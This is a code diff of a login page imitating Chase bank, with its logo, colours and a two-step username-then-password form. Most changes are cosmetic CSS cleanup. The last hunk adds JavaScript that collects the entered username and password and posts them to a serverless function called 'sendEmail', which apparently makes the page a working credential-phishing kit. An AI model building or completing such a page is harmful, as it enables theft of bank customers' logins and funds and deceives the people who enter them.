@@ -21,7 +21,6 @@ padding: 35px;
 border-radius: 12px;
 box-shadow: 0 10px 30px rgba(0,0,0,0.2);
 }
-/* Logo */
 .logo {
 display: flex;
 justify-content: center;
@@ -34,7 +33,6 @@ font-weight: 700;
 color: #117aca;
 letter-spacing: 1px;
 }
-/* Inputs */
 input {
 width: 100%;
 padding: 12px;
@@ -43,14 +41,12 @@ border: 1px solid #ccc;
 border-radius: 6px;
 font-size: 14px;
 }
-/* Options */
 .options {
 display: flex;
 justify-content: space-between;
 font-size: 13px;
 margin-bottom: 15px;
 }
-/* Button */
 button {
 width: 100%;
 padding: 12px;
@@ -62,18 +58,9 @@ font-weight: bold;
 cursor: pointer;
 }
 button:hover { background: #0d5f9c; }
-/* Links */
-.links {
-text-align: center;
-margin-top: 12px;
-font-size: 13px;
-}
-.links a {
-color: #117aca;
-text-decoration: none;
-}
+.links { text-align: center; margin-top: 12px; font-size: 13px; }
+.links a { color: #117aca; text-decoration: none; }
 .links a:hover { text-decoration: underline; }
-/* Steps */
 .step { display: none; }
 .step.active { display: block; }
 </style>
@@ -81,7 +68,6 @@ text-decoration: none;
 <body>
 
 <div class="login-container">
-<!-- Logo -->
 <div class="logo">
 <span>CHASE</span>
 <svg width="28" height="28" viewBox="0 0 100 100" style="margin-left:8px;">
@@ -90,7 +76,7 @@ text-decoration: none;
 </svg>
 </div>
 
-<!-- Form -->
+<!-- Login Form -->
 <form id="loginForm">
 <!-- STEP 1 -->
 <div class="step active" id="step1">
@@ -132,7 +118,19 @@ document.getElementById("step2").classList.add("active");
 }
 
 function submitForm(){
-alert("Form ready to send serverless request");
+const formData = {
+username: document.getElementById("hiddenUsername").value,
+password: document.querySelector("#step2 input[name='password']").value
+};
+
+fetch("/.netlify/functions/sendEmail", {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify(formData)
+})
+.then(res => res.json())
+.then(data => alert(data.message))
+.catch(err => console.error(err));
 }
 </script>
 
